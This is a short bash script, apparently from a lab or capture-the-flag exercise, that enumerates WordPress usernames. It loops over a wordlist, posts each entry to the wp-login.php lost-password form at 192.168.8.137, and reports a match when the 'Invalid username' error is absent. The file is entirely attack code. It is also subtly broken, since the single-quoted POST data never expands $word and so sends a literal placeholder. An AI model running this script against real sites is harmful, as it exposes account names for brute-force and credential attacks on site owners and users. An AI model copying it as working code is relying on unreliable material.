#!/bin/bash

while IFS= read -r word
do
	curl -X POST -d 'user_login=$word&redirect_to=&wp-submit=Get+New+Password' -s http://192.168.8.137/wp-login.php?action=lostpassword | if ! grep -q 'Invalid username or e-mail'; then echo "Match found: $word"; fi;
done < $1
